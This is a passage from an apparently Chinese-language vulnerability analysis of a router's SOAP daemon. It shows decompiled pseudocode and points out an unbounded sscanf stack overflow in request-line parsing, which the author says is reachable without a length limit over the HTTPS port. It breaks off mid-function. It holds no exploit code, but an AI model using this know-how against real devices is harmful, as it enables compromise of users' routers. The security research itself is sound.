class="keyword">if</span> ( v20 &gt; v21 &amp;&amp; v20 - v21 &gt; <span class="number">300</span> )</span><br><span class="line">            {</span><br><span class="line">              v61 = *(v17 - <span class="number">2</span>);</span><br><span class="line">              <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="number">0x2E</span>u);</span><br><span class="line">              *(v17 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">              ++v16;</span><br><span class="line">              log_log(<span class="number">7</span>, <span class="string">"close_timeout_client"</span>, <span class="number">204</span>, <span class="string">"client conn_fd %d close from slot %d"</span>, v61, v19);</span><br><span class="line">              close(*(v17 - <span class="number">2</span>));</span><br><span class="line">              *(v17 - <span class="number">2</span>) = <span class="number">-1</span>;</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">          ++v19;</span><br><span class="line">          v17 += <span class="number">23</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">while</span> ( v19 != <span class="number">64</span> );</span><br><span class="line">        log_log(</span><br><span class="line">          <span class="number">5</span>,</span><br><span class="line">          <span class="string">"close_timeout_client"</span>,</span><br><span class="line">          <span class="number">212</span>,</span><br><span class="line">          <span class="string">"Use Clients:[%d], Timeout Clients:[%d], Empty Clients:[%d]"</span>,</span><br><span class="line">          v18,</span><br><span class="line">          v16,</span><br><span class="line">          <span class="number">64</span> - v18);</span><br><span class="line">        p_optval = &amp;optval;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">32</span>; ++i )</span><br><span class="line">        {</span><br><span class="line">          p_optval-&gt;__fds_bits[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          p_optval = (fd_set *)((<span class="type">char</span> *)p_optval + <span class="number">4</span>);</span><br><span class="line">        }</span><br><span class="line">        v24 = v5;</span><br><span class="line">        v25 = _fdelt_chk(v5, <span class="number">0</span>, p_optval);</span><br><span class="line">        v27 = <span class="number">1</span> &lt;&lt; (v5 &amp; <span class="number">0x1F</span>);</span><br><span class="line">        optval.__fds_bits[v25] |= v63;</span><br><span class="line">        v28 = dword_49448;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( *v28 != <span class="number">-1</span> )</span><br><span class="line">          {</span><br><span class="line">            v29 = _fdelt_chk(*v28, v26, v27);</span><br><span class="line">            v26 = *v28 &amp; <span class="number">0x1F</span>;</span><br><span class="line">            v30 = &amp;v77[<span class="number">4</span> * v29 + <span class="number">92</span>];</span><br><span class="line">            <span class="keyword">if</span> ( *v28 &lt;= <span class="number">0</span> )</span><br><span class="line">              v26 = -(-*v28 &amp; <span class="number">0x1F</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v24 &lt; *v28 )</span><br><span class="line">              v24 = *v28;</span><br><span class="line">            v27 = *((_DWORD *)v30 - <span class="number">134</span>) | (<span class="number">1</span> &lt;&lt; v26);</span><br><span class="line">            *((_DWORD *)v30 - <span class="number">134</span>) = v27;</span><br><span class="line">          }</span><br><span class="line">          v28 += <span class="number">23</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">while</span> ( v28 != &amp;dword_4AB48 );</span><br><span class="line">        v62 = select(v24 + <span class="number">1</span>, &amp;optval, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v62 != <span class="number">-1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( dword_4823C )</span><br><span class="line">        {</span><br><span class="line">          log_log(<span class="number">5</span>, <span class="string">"soap_main"</span>, <span class="number">661</span>, <span class="string">"received signal %d, terminate soapservd"</span>, dword_4823C);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">        }</span><br><span class="line">        v33 = *_errno_location();</span><br><span class="line">        v34 = strerror(v33);</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">"soap_main"</span>, <span class="number">666</span>, <span class="string">"error on select, errno=%d(%s)"</span>, v33, v34);</span><br><span class="line">        usleep(<span class="number">0x64</span>u);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( (v63 &amp; optval.__fds_bits[_fdelt_chk(v5, v31, v32)]) == <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">memset</span>(v74, <span class="number">0</span>, <span class="number">46</span>);</span><br><span class="line">      fd = accept(v5, (<span class="keyword">struct</span> sockaddr *)addr, &amp;addr_len);</span><br><span class="line">      <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">      {</span><br><span class="line">        v35 = *_errno_location();</span><br><span class="line">        v36 = strerror(v35);</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">"soap_main"</span>, <span class="number">678</span>, <span class="string">"accept failed with errno=%d(%s)"</span>, v35, v36);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">      }</span><br><span class="line">      <span class="built_in">memset</span>(v75, <span class="number">0</span>, <span class="number">46</span>);</span><br><span class="line">      inet_ntop(<span class="number">10</span>, &amp;addr[<span class="number">8</span>], (<span class="type">char</span> *)v75, <span class="number">0x2E</span>u);</span><br><span class="line">      log_log(<span class="number">7</span>, <span class="string">"soap_main"</span>, <span class="number">687</span>, <span class="string">"client IPv6 ip=%s"</span>, (<span class="type">const</span> <span class="type">char</span> *)v75);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)v75, <span class="number">46</span>) &amp;&amp; <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)v75, <span class="string">":ffff:"</span>) )</span><br><span class="line">        v37 = <span class="built_in">strrchr</span>((<span class="type">const</span> <span class="type">char</span> *)v75, <span class="number">58</span>) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v37 = (<span class="type">char</span> *)v75;</span><br><span class="line">      _strcpy_chk(v74, v37, <span class="number">46</span>);</span><br><span class="line">      log_log(<span class="number">7</span>, <span class="string">"soap_main"</span>, <span class="number">707</span>, <span class="string">"client ip=%s"</span>, (<span class="type">const</span> <span class="type">char</span> *)v74);</span><br><span class="line">      <span class="keyword">if</span> ( a1 )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( cmsUtl_strcmp(v74, <span class="string">"127.0.0.1"</span>) )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( cmsNet_getLanInfo(<span class="string">"br0"</span>, &amp;in, v68) || (v50 = inet_ntoa(in), cmsUtl_strcmp(v74, v50)) )</span><br><span class="line">          {</span><br><span class="line">            log_log(<span class="number">3</span>, <span class="string">"soap_main"</span>, <span class="number">730</span>, <span class="string">"Reject this client (IP address is %s)"</span>, (<span class="type">const</span> <span class="type">char</span> *)v74);</span><br><span class="line">            close(fd);</span><br><span class="line">            fd = <span class="number">-1</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      v38 = fd;</span><br><span class="line">      <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">memset</span>(v77, <span class="number">0</span>, <span class="number">0x58</span>u);</span><br><span class="line">        v76 = fd;</span><br><span class="line">        v39 = <span class="number">0</span>;</span><br><span class="line">        _strcpy_chk(&amp;v77[<span class="number">4</span>], v74, <span class="number">46</span>);</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">          v40 = &amp;dword_49448[<span class="number">23</span> * v39];</span><br><span class="line">          <span class="keyword">if</span> ( *v40 == <span class="number">-1</span> )</span><br><span class="line">          {</span><br><span class="line">            *v40 = v38;</span><br><span class="line">            v40[<span class="number">1</span>] = time(<span class="number">0</span>);</span><br><span class="line">            _strcpy_chk(&amp;dword_49448[<span class="number">23</span> * v39 + <span class="number">2</span>], &amp;v77[<span class="number">4</span>], <span class="number">46</span>);</span><br><span class="line">            log_log(</span><br><span class="line">              <span class="number">7</span>,</span><br><span class="line">              <span class="string">"add_client"</span>,</span><br><span class="line">              <span class="number">145</span>,</span><br><span class="line">              <span class="string">"new client conn_fd %d (%s) inserted at slot %d at %ld"</span>,</span><br><span class="line">              v76,</span><br><span class="line">              &amp;v77[<span class="number">4</span>],</span><br><span class="line">              v39,</span><br><span class="line">              v40[<span class="number">1</span>]);</span><br><span class="line">            log_log(<span class="number">7</span>, <span class="string">"soap_main"</span>, <span class="number">743</span>, <span class="string">"accepted new client at fd=%d, use select to detect first data"</span>, fd);</span><br><span class="line">            fd = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">          }</span><br><span class="line">          ++v39;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">while</span> ( v39 != <span class="number">64</span> );</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">"add_client"</span>, <span class="number">152</span>, <span class="string">"could not insert new client fd %d, MAX_SOAPSERVERD_CLIENT_FDS=%d"</span>, v38, <span class="number">64</span>);</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">"soap_main"</span>, <span class="number">749</span>, <span class="string">"fd is full, so delete an fd with the longest time\\n"</span>);</span><br><span class="line">        v51 = <span class="number">31</span>;</span><br><span class="line">        v52 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">          --v51;</span><br><span class="line">          v52 *= <span class="number">2</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">while</span> ( v51 );</span><br><span class="line">        v53 = v52 - <span class="number">1</span>;</span><br><span class="line">        log_log(<span class="number">7</span>, <span class="string">"replace_client"</span>, <span class="number">225</span>, <span class="string">"timestamp is %ld"</span>, v53);</span><br><span class="line">        v54 = dword_49448;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j != <span class="number">64</span>; ++j )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( *v54 != <span class="number">-1</span> &amp;&amp; v54[<span class="number">1</span>] &lt; v53 )</span><br><span class="line">          {</span><br><span class="line">            v53 = v54[<span class="number">1</span>];</span><br><span class="line">            v51 = j;</span><br><span class="line">          }</span><br><span class="line">          v54 += <span class="number">23</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ( v51 &lt;= <span class="number">63</span> )</span><br><span class="line">        {</span><br><span class="line">          v56 = &amp;dword_49448[<span class="number">23</span> * v51];</span><br><span class="line">          close(*v56);</span><br><span class="line">          *v56 = v76;</span><br><span class="line">          v56[<span class="number">1</span>] = time(<span class="number">0</span>);</span><br><span class="line">          _strcpy_chk(&amp;dword_49448[<span class="number">23</span> * v51 + <span class="number">2</span>], &amp;v77[<span class="number">4</span>], <span class="number">46</span>);</span><br><span class="line">          log_log(</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="string">"replace_client"</span>,</span><br><span class="line">            <span class="number">245</span>,</span><br><span class="line">            <span class="string">"Replace client conn_fd %d (%s) inserted at slot %d at %ld"</span>,</span><br><span class="line">            v76,</span><br><span class="line">            &amp;v77[<span class="number">4</span>],</span><br><span class="line">            v51,</span><br><span class="line">            v56[<span class="number">1</span>]);</span><br><span class="line">        }</span><br><span class="line">        fd = <span class="number">-1</span>;</span><br><span class="line">      }</span><br><span class="line">LABEL_53:</span><br><span class="line">      ;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">while</span> ( v62 &lt;= <span class="number">1</span> );</span><br><span class="line">    v41 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v73, <span class="number">0</span>, <span class="number">0x2E</span>u);</span><br><span class="line">    v44 = dword_49448;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( *v44 != <span class="number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        v45 = _fdelt_chk(*v44, v42, v43);</span><br><span class="line">        v46 = *v44;</span><br><span class="line">        v47 = *v44 &amp; <span class="number">0x1F</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *v44 &lt;= <span class="number">0</span> )</span><br><span class="line">          v47 = -(-*v44 &amp; <span class="number">0x1F</span>);</span><br><span class="line">        v43 = optval.__fds_bits[v45];</span><br><span class="line">        <span class="keyword">if</span> ( (v43 &amp; (<span class="number">1</span> &lt;&lt; v47)) != <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      }</span><br><span class="line">      ++v41;</span><br><span class="line">      v44 += <span class="number">23</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v41 == <span class="number">64</span> )</span><br><span class="line">      {</span><br><span class="line">        log_log(<span class="number">5</span>, <span class="string">"find_and_activate_client_ip"</span>, <span class="number">585</span>, <span class="string">"Could not find any active client fd's, ignoring"</span>);</span><br><span class="line">        log_log(<span class="number">3</span>, <span class="string">"soap_main"</span>, <span class="number">767</span>, <span class="string">"Cannot figure out which fd is set!!  Abort and exit."</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    fd = *v44;</span><br><span class="line">    _strcpy_chk(v73, &amp;dword_49448[<span class="number">23</span> * v41 + <span class="number">2</span>], <span class="number">46</span>);</span><br><span class="line">    log_log(<span class="number">7</span>, <span class="string">"find_and_activate_client_ip"</span>, <span class="number">580</span>, <span class="string">"find IP [%s] and handle [%d]"</span>, (<span class="type">const</span> <span class="type">char</span> *)v73, v46);</span><br><span class="line">    log_log(<span class="number">7</span>, <span class="string">"soap_main"</span>, <span class="number">771</span>, <span class="string">"=== start service of conn_fd=%d ==="</span>, fd);</span><br><span class="line">    v69[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    v69[<span class="number">1</span>] = &amp;unk_493E0;</span><br><span class="line">    setsockopt(fd, <span class="number">1</span>, <span class="number">20</span>, v69, <span class="number">8u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sub_8F20(fd) )</span><br><span class="line">    {</span><br><span class="line">      v48 = _errno_location();</span><br><span class="line">      log_log(<span class="number">3</span>, <span class="string">"soap_main"</span>, <span class="number">787</span>, <span class="string">"fdopen failed with errno=%d"</span>, *v48);</span><br><span class="line">      v49 = sub_4ED0(fd);</span><br><span class="line">      sub_8F78(v49);</span><br><span class="line">      fd = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    }</span><br><span class="line">    sub_52F0(v73);</span><br><span class="line">    v57 = sub_8F50(&amp;fd);</span><br><span class="line">    <span class="keyword">if</span> ( dword_48240 != <span class="number">5</span> )</span><br><span class="line">      sub_8F9C(v57);</span><br><span class="line">    v58 = sub_4ED0(fd);</span><br><span class="line">    sub_8F78(v58);</span><br><span class="line">    fd = <span class="number">-1</span>;</span><br><span class="line">    v59 = dword_48240 == <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_48240 != <span class="number">4</span> )</span><br><span class="line">      v59 = dword_48240 == <span class="number">1</span>;</span><br><span class="line">    v60 = v59;</span><br><span class="line">    <span class="keyword">if</span> ( v59 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( dword_48240 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_87;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        dword_48240 = v60;</span><br><span class="line">        system(<span class="string">"/usr/sbin/ntgr_speedtest.sh &amp;"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( dword_48240 == <span class="number">7</span> )</span><br><span class="line">LABEL_87:</span><br><span class="line">    data_Restoredefault(<span class="string">"SOAP_SERVER"</span>, <span class="number">5000</span>, <span class="string">"admin"</span>, <span class="string">""</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_48240 == <span class="number">1</span> )</span><br><span class="line">    data_Reboot(<span class="string">"SOAP_SERVER"</span>, <span class="number">5000</span>, <span class="string">"admin"</span>, <span class="string">""</span>);</span><br><span class="line">LABEL_37:</span><br><span class="line">  close(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>初始化Socket，绑定端口，监听连接</p><p>使用select监听客户端连接，接受连接请求</p><p>对于有数据的连接，接收并处理SOAP请求</p><p>sub_52F0函数则是对SOAP请求进行解析，而漏洞点也发生在这里</p><p>定期扫描并关闭超时的连接</p><p>跟进sub_52F0函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_52F0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v12; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> line[<span class="number">512</span>]; <span class="comment">// [sp+24h] [bp-FDCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> method[<span class="number">512</span>]; <span class="comment">// [sp+824h] [bp-7DCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> path[<span class="number">2048</span>]; <span class="comment">// [sp+1024h] [bp+24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> protocol[<span class="number">2048</span>]; <span class="comment">// [sp+1824h] [bp+824h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">2048</span>]; <span class="comment">// [sp+2024h] [bp+1024h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">2052</span>]; <span class="comment">// [sp+2824h] [bp+1824h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(line, <span class="number">0</span>, <span class="keyword">sizeof</span>(line));</span><br><span class="line">  <span class="built_in">memset</span>(method, <span class="number">0</span>, <span class="keyword">sizeof</span>(method));</span><br><span class="line">  <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">  <span class="built_in">memset</span>(protocol, <span class="number">0</span>, <span class="keyword">sizeof</span>(protocol));</span><br><span class="line">  <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="keyword">sizeof</span>(v17));</span><br><span class="line">  <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_8EF0(line) )</span><br><span class="line">  {</span><br><span class="line">    log_log(<span class="number">7</span>, <span class="string">"handle_soapRequest"</span>, <span class="number">384</span>, <span class="string">"line:[%s]"</span>, (<span class="type">const</span> <span class="type">char</span> *)line);</span><br><span class="line">    v2 = <span class="string">"No request found."</span>;</span><br><span class="line">LABEL_3:</span><br><span class="line">    sub_8AC4(<span class="number">400</span>, <span class="string">"Bad Request"</span>, <span class="number">0</span>, v2);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( _isoc99_sscanf(line, <span class="string">"%[^ ] %[^ ] %[^ ]"</span>, method, path, protocol) != <span class="number">3</span> )</span><br><span class="line">  {</span><br><span class="line">    log_log(<span class="number">7</span>, <span class="string">"handle_soapRequest"</span>, <span class="number">400</span>, <span class="string">"method:[%s], path:[%s], protocol:[%s]"</span>, (<span class="type">const</span> <span class="type">char</span> *)method, path, protocol);</span><br><span class="line">    v2 = <span class="string">"Can't parse request."</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp((<span class="type">const</span> <span class="type">char</span> *)method, <span class="string">"post"</span>) )</span><br><span class="line">  {</span><br><span class="line">    log_log(<span class="number">7</span>, <span class="string">"handle_soapRequest"</span>, <span class="number">407</span>, <span class="string">"Received method is [%s]."</span>, (<span class="type">const</span> <span class="type">char</span> *)method);</span><br><span class="line">    v2 = <span class="string">"That method is not handled by us."</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">  }</span><br><span class="line">  sub_5044(a1);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( sub_8EF0(line) == <span class="number">1</span> &amp;&amp; cmsUtl_strcmp(line, <span class="string">"\\n"</span>) &amp;&amp; cmsUtl_strcmp(line, <span class="string">"\\r\\n"</span>) )</span><br><span class="line">  {</span><br><span class="line">    v5 = cmsUtl_strlen(<span class="string">"SOAPAction:"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( cmsUtl_strncasecmp(line, <span class="string">"SOAPAction:"</span>, v5) )</span><br><span class="line">    {</span><br><span class="line">      v7 = <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)line, <span class="string">"Content-Length:"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      {</span><br><span class="line">        v8 = cmsUtl_strlen(<span class="string">"Content-Length: "</span>);</span><br><span class="line">        v9 = atoi(&amp;v7[v8]);</span><br><span class="line">        log_log(<span class="number">7</span>, <span class="string">"handle_soapRequest"</span>, <span class="number">438</span>, <span class="string">"Content-Length:[%d]"</span>, v9);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v10 = cmsUtl_strlen(<span class="string">"Cookie:"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !strncasecmp((<span class="type">const</span> <span class="type">char</span> *)line, <span class="string">"Cookie:"</span>, v10) )</span><br><span class="line">        {</span><br><span class="line">          v11 = (<span class="type">const</span> <span class="type">char</span> *)sub_50D4(line);</span><br><span class="line">          v12 = (<span class="type">char</span> *)v11;</span><br><span class="line">          <span class="keyword">if</span> ( v11 )</span><br><span class="line">          {</span><br><span class="line">            sub_4FB0((<span class="type">const</span> <span class="type">char</span> *)a1, v11);</span><br><span class="line">            log_log(<span class="number">7</span>, <span class="string">"handle_soapRequest"</span>, <span class="number">447</span>, <span class="string">"token:[%s]"</span>, v12);</span><br><span class="line">            <span class="built_in">free</span>(v12);</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      v6 = <span class="built_in">strspn</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;line[<span class="number">2</span>] + <span class="number">3</span>, <span class="string">" \\t"</span>);</span><br><span class="line">      cmsUtl_strncpy(v17, (<span class="type">char</span> *)&amp;line[<span class="number">2</span>] + v6 + <span class="number">3</span>, <span class="number">2048</span>);</span><br><span class="line">      log_log(<span class="number">7</span>, <span class="string">"handle_soapRequest"</span>, <span class="number">432</span>, <span class="string">"soapAction:[%s]"</span>, v17);</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  {</span><br><span class="line">    v4 = sub_8EC0((<span class="type">int</span>)v18);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      v18[v4 + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      sub_6F78(<span class="number">0</span>, v17, v18, a1);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>会将第一行给切割成method，path，protocol</p><p>例如：POST /soap/server_sa/ HTTP/1.1，会被切割成method = POST, path = /soap/server_sa/, protocol = HTTP/1.1</p><p>这里的sscanf发生了溢出，可以传入很大的数据来使得变量溢出</p><p>但是这里有一个限制，从http端口进去的时候会有一个0x800的数据限制</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">sub_81B4</span><span class="params">(<span class="type">int</span> a1, <span class="type">void</span> *s)</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">  <span class="keyword">return</span> fread(s, <span class="number">1u</span>, <span class="number">0x800</span>u, *(FILE **)(a1 + <span class="number">12</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>而从https端口进去的时候没有数据长度限制</p><p>会一直读取数据，直到发送\n</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_838C</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> *buf)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> error; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">bool</span> v8; <span class="comment">// cc</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [sp+4h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v9 = (<span class="type">char</span>)buf;</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v5 = SSL_read();</span><br><span class="line">      <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      